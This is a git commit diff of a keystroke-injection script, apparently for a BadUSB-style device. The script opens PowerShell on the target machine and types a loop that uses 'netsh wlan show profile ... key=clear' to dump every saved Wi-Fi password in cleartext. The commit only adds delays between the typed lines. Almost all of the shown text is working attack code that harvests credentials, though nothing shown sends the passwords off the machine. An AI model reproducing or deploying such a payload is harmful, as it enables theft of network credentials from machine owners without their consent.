df58daf30c96b288f458eb286937e2e8ef181d4e
Radoslav Sheytanov-Ruxton <133638936+RadoslavSheytanov@users.noreply.github.com>
2024-04-07 06:47:40 -0700

    Update wifiPassDisplayPowershell.js
    Adding delays and maintenance debugging

--- Wifi Password Display Powershell/wifiPassDisplayPowershell.js
+++ Wifi Password Display Powershell/wifiPassDisplayPowershell.js
@@ -2,6 +2,7 @@ layout("us");
 typingSpeed(0,0);
 
 press("GUI r");
+delay(500);
 type("powershell");
 press("ENTER");
 delay(500);
@@ -12,13 +13,17 @@ delay(500);
 
 type("foreach ($profile in $wifiProfiles) {");
 press("ENTER");
+delay(500);
 type("    $profileName = $profile -replace \"    All User Profile\\s*:\\s*\",\"\"");
 press("ENTER");
+delay(500);
 type("    $wifiPassword = (netsh wlan show profile name=\"$profileName\" key=clear) | Select-String \"Key Content\"");
 press("ENTER");
+delay(500);
 type("    $password = $wifiPassword -replace \".*Key Content\\s*:\\s*\",\"\"");
 press("ENTER");
+delay(500);
 type("    Write-Output \"$profileName : $password\"");
 press("ENTER");
+delay(500);
 type("}");
-press("ENTER");
